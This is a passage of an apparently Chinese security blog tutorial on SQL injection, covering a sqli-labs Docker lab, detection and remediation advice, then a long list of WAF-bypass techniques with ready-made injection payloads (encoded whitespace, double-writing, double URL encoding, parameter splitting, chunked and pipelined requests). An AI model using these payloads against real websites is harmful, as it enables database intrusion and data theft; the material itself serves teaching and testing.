EOF</span><br></pre></td></tr></tbody></table></figure>\n\n<p>访问网页，环境搭建完毕。</p>\n<img src=\"/posts/31899/image-20250305014536324.png\" class=\"\" title=\"image-20250305014536324\">\n\n<p>查看相关版本细节。</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker <span class=\"built_in\">exec</span> -it sqli-labs /bin/bash</span><br><span class=\"line\">$ mysql -e <span class=\"string\">\"select version(),user()\"</span></span><br><span class=\"line\">+-------------------------+----------------+</span><br><span class=\"line\">| version()               | user()         |</span><br><span class=\"line\">+-------------------------+----------------+</span><br><span class=\"line\">| 5.5.44-0ubuntu0.14.04.1 | root@localhost |</span><br><span class=\"line\">+-------------------------+----------------+</span><br><span class=\"line\">$ php --version</span><br><span class=\"line\">PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)</span><br><span class=\"line\">Copyright (c) 1997-2014 The PHP Group</span><br><span class=\"line\">Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span><br><span class=\"line\">    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> /etc/init.d/ &amp;&amp; apache2 -v</span><br><span class=\"line\">Server version: Apache/2.4.7 (Ubuntu)</span><br><span class=\"line\">Server built:   Oct 14 2015 14:20:21</span><br></pre></td></tr></tbody></table></figure>\n\n","length":6865,"excerpt":"","more":"<h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1. 概述\"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>\n<p>​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>\n<p><strong>漏洞存在条件</strong></p>\n<ul>\n<li>参数用户可控。</li>\n<li>参数带入数据库查询。</li>\n</ul>\n<p><strong>测试方法</strong></p>\n<p>​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1&#x3D;1 和 and 1&#x3D;2 以及字符型注入进行判断。</p>\n<p><strong>修复方法</strong></p>\n<p>​\t在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>\n<p>​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>\n<p>​\t（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>\n<p>​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>\n<p>​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>\n<p>​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>\n<p>​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>\n<p>​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>\n<h3 id=\"1-1-MySQL相关知识\"><a href=\"#1-1-MySQL相关知识\" class=\"headerlink\" title=\"1.1 MySQL相关知识\"></a>1.1 MySQL相关知识</h3><p>​\t在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>\n<h3 id=\"1-2-判断是否存在注入\"><a href=\"#1-2-判断是否存在注入\" class=\"headerlink\" title=\"1.2 判断是否存在注入\"></a>1.2 判断是否存在注入</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">2</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span><span class=\"keyword\">or</span><span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">id<span class=\"operator\">=</span>&quot;1&quot;<span class=\"keyword\">or</span>&quot;1&quot;<span class=\"operator\">=</span>&quot;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p><strong>有回显</strong>：页面有数据信息返回。</p>\n<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>\n<h3 id=\"1-3-SQL注释符\"><a href=\"#1-3-SQL注释符\" class=\"headerlink\" title=\"1.3 SQL注释符\"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>\n<p><code>--空格</code>：单行注释，注意后面有个空格。</p>\n<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>\n<h3 id=\"1-4-SQL注入分类\"><a href=\"#1-4-SQL注入分类\" class=\"headerlink\" title=\"1.4 SQL注入分类\"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>\n<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>\n<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>\n<h2 id=\"2-SQL注入绕过\"><a href=\"#2-SQL注入绕过\" class=\"headerlink\" title=\"2. SQL注入绕过\"></a>2. SQL注入绕过</h2><h3 id=\"2-1-空格字符绕过\"><a href=\"#2-1-空格字符绕过\" class=\"headerlink\" title=\"2.1 空格字符绕过\"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>\n<p><code>%09</code>：TAB键（水平）</p>\n<p><code>%0a</code>：新建一行</p>\n<p><code>%0c</code>：新的一页</p>\n<p><code>%0d</code>：return功能</p>\n<p><code>%0b</code>：TAB键（垂直）</p>\n<p><code>%00</code>：空字符</p>\n<p><code>/**/</code>：替换空格</p>\n<p><code>/*!*/</code>：内联注释</p>\n<h3 id=\"2-2-大小写绕过\"><a href=\"#2-2-大小写绕过\" class=\"headerlink\" title=\"2.2 大小写绕过\"></a>2.2 大小写绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">-</span><span class=\"operator\">&gt;</span> <span class=\"keyword\">UniOn</span> <span class=\"keyword\">SelEcT</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-3-浮点数绕过\"><a href=\"#2-3-浮点数绕过\" class=\"headerlink\" title=\"2.3 浮点数绕过\"></a>2.3 浮点数绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8E0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8.0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-4-NULL绕过\"><a href=\"#2-4-NULL绕过\" class=\"headerlink\" title=\"2.4 NULL绕过\"></a>2.4 NULL绕过</h3><p><code>\\N</code>代表NULL</p>\n<h3 id=\"2-5-引号绕过\"><a href=\"#2-5-引号绕过\" class=\"headerlink\" title=\"2.5 引号绕过\"></a>2.5 引号绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span>&quot;1&quot; #双引号绕过</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"number\">0x61646D696E</span>; # 字符串转换为<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(column_name)</span><br><span class=\"line\"><span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> TABLE_NAME<span class=\"operator\">=</span><span class=\"string\">&#x27;users&#x27;</span> limit <span class=\"number\">1</span>),<span class=\"number\">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-6-添加库名绕过\"><a href=\"#2-6-添加库名绕过\" class=\"headerlink\" title=\"2.6 添加库名绕过\"></a>2.6 添加库名绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> test.users;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-7-去重复绕过\"><a href=\"#2-7-去重复绕过\" class=\"headerlink\" title=\"2.7 去重复绕过\"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,version() fromusers;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-8-反引号绕过\"><a href=\"#2-8-反引号绕过\" class=\"headerlink\" title=\"2.8 反引号绕过\"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> `test.users`;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-9-语言特性绕过\"><a href=\"#2-9-语言特性绕过\" class=\"headerlink\" title=\"2.9 语言特性绕过\"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id&#x3D;1&amp;id&#x3D;2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">服务器中间件</th>\n<th align=\"center\">解析结果</th>\n<th align=\"center\">举例说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">ASP.NET&#x2F;IIS</td>\n<td align=\"center\">所有出现的参数值用逗号连接</td>\n<td align=\"center\">color&#x3D;red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">ASP&#x2F;IIS</td>\n<td align=\"center\">所有出现的参数用逗号连接</td>\n<td align=\"center\">color&#x3D;red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP&#x2F;Apache</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color&#x3D;blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP&#x2F;Zeus</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color&#x3D;blue</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet&#x2F;Apache Tomcat</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet&#x2F;Oracle Application Server 10g</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet&#x2F;Jetty</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">IBM Lotus Domino</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color&#x3D;blue</td>\n</tr>\n<tr>\n<td align=\"center\">IBM HTTP Server</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_perl,libapreq2&#x2F;Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">Perl CGI&#x2F;Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_wsgi(Python)&#x2F;Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">Python&#x2F;Zope</td>\n<td align=\"center\">转化为List</td>\n<td align=\"center\">color&#x3D;[‘red’,’blue’]</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-10-逗号绕过\"><a href=\"#2-10-逗号绕过\" class=\"headerlink\" title=\"2.10 逗号绕过\"></a>2.10 逗号绕过</h3><p><code>substr</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>(substr(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p><code>mid</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> mid(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p><code>join</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)a <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> <span class=\"number\">2</span>)b</span><br></pre></td></tr></table></figure>\n\n<p><code>like</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%r%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>offset</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">limit <span class=\"number\">1</span> <span class=\"keyword\">offset</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-11-or-and-xor-not绕过\"><a href=\"#2-11-or-and-xor-not绕过\" class=\"headerlink\" title=\"2.11 or and xor not绕过\"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>\n<p><code>||</code>等价于or</p>\n<p><code>!</code>等价于not</p>\n<p><code>|</code>等价于xor</p>\n<h3 id=\"2-12-ASCII字符对比绕过\"><a href=\"#2-12-ASCII字符对比绕过\" class=\"headerlink\" title=\"2.12 ASCII字符对比绕过\"></a>2.12 ASCII字符对比绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">=</span><span class=\"number\">114</span>; # <span class=\"type\">char</span>(<span class=\"number\">114</span>)<span class=\"operator\">=</span><span class=\"string\">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-13-等号绕过\"><a href=\"#2-13-等号绕过\" class=\"headerlink\" title=\"2.13 等号绕过\"></a>2.13 等号绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&lt;</span><span class=\"number\">115</span>; # <span class=\"operator\">&gt;</span> <span class=\"operator\">&lt;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"keyword\">like</span> <span class=\"string\">&#x27;r%&#x27;</span>; #<span class=\"keyword\">like</span> rlike</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() regexp <span class=\"string\">&#x27;^r&#x27;</span>; # regexp</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-14-双写绕过\"><a href=\"#2-14-双写绕过\" class=\"headerlink\" title=\"2.14 双写绕过\"></a>2.14 双写绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uniunionon seleselectct</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-15-二次编码绕过\"><a href=\"#2-15-二次编码绕过\" class=\"headerlink\" title=\"2.15 二次编码绕过\"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>\n<p>第一次编码：</p>\n<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>\n<p>第二次编码：</p>\n<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>\n<h3 id=\"2-16-参数拆分绕过\"><a href=\"#2-16-参数拆分绕过\" class=\"headerlink\" title=\"2.16 参数拆分绕过\"></a>2.16 参数拆分绕过</h3><p>对于a&#x3D;[input1]&amp;b&#x3D;[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-17-生僻函数绕过\"><a href=\"#2-17-生僻函数绕过\" class=\"headerlink\" title=\"2.17 生僻函数绕过\"></a>2.17 生僻函数绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> polygon((<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> @<span class=\"variable\">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-18-分块传输绕过\"><a href=\"#2-18-分块传输绕过\" class=\"headerlink\" title=\"2.18 分块传输绕过\"></a>2.18 分块传输绕过</h3><p>​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>\n<p>​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\\r\\n”)。然后是数据本身，数据结束后，还会有CRLF(“\\r\\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>\n<h3 id=\"2-19-信任白名单绕过\"><a href=\"#2-19-信任白名单绕过\" class=\"headerlink\" title=\"2.19 信任白名单绕过\"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">/</span>phpmyadmin?name<span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"keyword\">user</span>()<span class=\"comment\">--+&amp;submit=1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-20-pipline绕过\"><a href=\"#2-20-pipline绕过\" class=\"headerlink\" title=\"2.20 pipline绕过\"></a>2.20 pipline绕过</h3><p>​\thttp 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>\n<p>​\t用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。</p>\n<h3 id=\"2-21-利用multipart-form-data绕过\"><a href=\"#2-21-利用multipart-form-data绕过\" class=\"headerlink\" title=\"2.21 利用multipart&#x2F;form-data绕过\"></a>2.21 利用multipart&#x2F;form-data绕过</h3><p>​\tmultipart&#x2F;form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>\n<h3 id=\"2-22-order-by-绕过\"><a href=\"#2-22-order-by-绕过\" class=\"headerlink\" title=\"2.22 order by 绕过\"></a>2.22 order by 绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">into</span> <span class=\"variable\">@a</span>,<span class=\"variable\">@b</span>,<span class=\"variable\">@c</span>,<span class=\"variable\">@d</span>; # 替代<span class=\"keyword\">order</span> <span class=\"keyword\">by</span>猜解字段数</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-23-修改请求方式绕过\"><a href=\"#2-23-修改请求方式绕过\" class=\"headerlink\" title=\"2.23 修改请求方式绕过\"></a>2.23 修改请求方式绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以更改请求方式尝试绕过。</p>\n<h3 id=\"2-24-大量字符绕过\"><a href=\"#2-24-大量字符绕过\" class=\"headerlink\" title=\"2.24 大量字符绕过\"></a>2.24 大量字符绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">select</span> <span class=\"number\">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-25-花括号绕过\"><a href=\"#2-25-花括号绕过\" class=\"headerlink\" title=\"2.25 花括号绕过\"></a>2.25 花括号绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span>&#123;x <span class=\"number\">1</span>&#125;,<span class=\"keyword\">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-26-union-select绕过\"><a 